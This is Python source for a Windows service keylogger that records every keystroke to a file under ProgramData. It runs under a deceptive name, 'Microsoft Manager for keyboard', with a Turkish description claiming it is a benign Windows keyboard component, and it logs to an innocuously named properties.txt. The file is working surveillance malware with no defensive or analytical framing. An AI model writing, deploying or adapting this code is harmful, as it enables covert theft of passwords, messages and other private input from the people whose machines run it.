import win32serviceutil
import win32service
import win32event
import datetime
import time
import pynput

class KeyloggerService(win32serviceutil.ServiceFramework):
    _svc_name_ = "Microsoft Manager for keyboard"
    _svc_display_name_ = "Manager For Keyboard"
    _svc_description_ = "Klavyede basılan tuşların windows tarafından algılanmasını sağlar."

    FILE_PATH = "C:\\ProgramData\\MyService\\properties.txt"  # Dosya yolunu belirleyin

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.running = True
        self.listener = None

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        self.running = False
        if self.listener:
            self.listener.stop()
        win32event.SetEvent(self.hWaitStop)

    def SvcDoRun(self):
        self.main()

    def write_datetime_to_file(self):
        with open(self.FILE_PATH, "a") as f:
            current_datetime = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write("\n")
            f.write(current_datetime)
            f.write("\n")

    def on_press(self, key):
        try:
            with open(self.FILE_PATH, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                with open(self.FILE_PATH, "a") as f:
                    f.write(" ")
            else:
                with open(self.FILE_PATH, "a") as f:
                    f.write(f" {key} ")

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            return False

    def main(self):
        self.write_datetime_to_file()
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as self.listener:
            while self.running:
                time.sleep(1)  # Hizmet çalışıyor
            self.listener.join()

if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(KeyloggerService)
